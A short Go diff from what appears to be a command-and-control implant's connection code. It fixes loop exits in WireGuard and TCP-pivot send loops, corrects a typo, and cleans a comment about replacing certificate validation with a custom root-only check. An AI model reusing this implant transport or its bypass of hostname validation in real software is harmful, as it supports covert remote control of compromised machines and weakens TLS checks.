@@ -489,12 +489,12 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 				}
 				err := socketWGWriteEnvelope(conn, envelope)
 				if err != nil {
-					break
+					return
 				}
 			case <-time.After(mtlsPingInterval):
 				socketWGWritePing(conn)
 				if err != nil {
-					break
+					return
 				}
 			}
 		}
@@ -704,7 +704,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
 			// {{end}}
-			tcpPivoteWriteEnvelope(&conn, envelope)
+			tcpPivotWriteEnvelope(&conn, envelope)
 		}
 	}()
 
@@ -730,7 +730,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 // {{end}} -TCPPivotc2Enabled
 
 // rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
-// we have to disable all of the fucking certificate validation and re-implement everything.
+// we have to disable all of the certificate validation and re-implement everything.
 // https://github.com/golang/go/issues/21971
 func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {
 
